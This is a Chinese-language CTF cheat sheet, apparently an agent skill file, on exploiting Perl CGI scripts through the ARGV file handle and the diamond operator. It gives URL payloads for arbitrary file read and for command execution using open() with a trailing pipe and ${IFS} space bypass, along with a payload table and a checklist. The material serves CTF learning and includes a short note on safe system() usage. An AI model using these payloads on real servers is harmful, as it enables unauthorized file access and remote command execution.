---
name: perl-vulns
description: Use when encountering Perl CGI 漏洞 - ARGV 文件句柄、钻石操作符、命令注入、任意文件读取
---

# Perl CGI 漏洞

## Info

- **Tags**: perl, cgi, rce, file-read
- **场景**: CTF Web 题、Perl CGI 脚本漏洞利用

---

## 1. 核心漏洞点

| 利用点 | 关键函数/变量 | 风险 |
|--------|--------------|------|
| 文件上传与读取 | `param()`, `<>` 操作符 | 任意文件读取 / 命令执行 |
| 命令注入 | `system()`, `exec()`, `open()` | 未过滤输入直接执行 |
| 特殊文件句柄 | `ARGV` | 命令行参数当作文件读取执行 |
| 输入/输出处理 | `<>` (钻石操作符) | 读取任意文件 |
| 参数处理模块 | `Getopt::ArgvFile` | 配置不当改变 `@ARGV` 行为 |

---

## 2. ARGV + 钻石操作符攻击（i-got-id-200 题型）

### 漏洞代码示例

```perl
use CGI;
my $cgi = CGI->new;
if ($cgi->upload('file')) {
    my $file = $cgi->param('file');  # 危险：只取第一个文件句柄
    while (<$file>) {                 # 危险：<> 读取文件句柄
        print "$_";
    }
}
```

### 原理

- `$cgi->param('file')` 返回文件列表，赋值给标量只取第一个
- `<>` 操作符遇到 `ARGV` 文件句柄时，会遍历 `@ARGV` 数组
- CGI 模式下，URL 查询字符串参数会被放入 `@ARGV`

### 利用步骤

#### Step 1: 任意文件读取

1. 抓包上传请求，复制 `file` 字段
2. **删除 `filename` 参数，内容改为 `ARGV`**
3. URL 指定要读取的文件：

```
/cgi-bin/file.pl?/var/www/cgi-bin/file.pl
```

#### Step 2: 命令执行

Perl 的 `open()` 底层特性：**文件名以 `|` 结尾时，作为命令执行**

```
# 列根目录（${IFS} 替代空格）
/cgi-bin/file.pl?/bin/bash%20-c%20ls${IFS}/|

# 直接用空格
/cgi-bin/file.pl?ls%20-l%20/%20|

# 读取 Flag
/cgi-bin/file.pl?/flag
/cgi-bin/file.pl?cat%20/flag%20|
```

### Payload 汇总

| 步骤 | Payload | 说明 |
|------|---------|------|
| 读取源码 | `?/var/www/cgi-bin/file.pl` | 查看后台代码 |
| 列根目录 | `?/bin/bash%20-c%20ls${IFS}/|` | `${IFS}` 替代空格 |
| 列根目录 | `?ls%20-l%20/%20|` | 直接命令+管道符 |
| 读 Flag | `?/flag` | Flag 在根目录 |
| 读 Flag | `?cat%20/flag%20|` | 命令读取 |

---

## 3. 命令注入

```perl
# 不安全的写法
system("ls " . $user_input);
open(FH, "cat $file");

# 安全写法：使用列表形式
system("ls", $user_input);
```

---

## 4. CTF 检查清单

- [ ] 检查是否 Perl CGI 应用
- [ ] 上传点尝试 `ARGV` 注入
- [ ] URL 参数指定文件路径读取
- [ ] 命令结尾加 `|` 执行任意命令
- [ ] `${IFS}` 替代空格绕过过滤
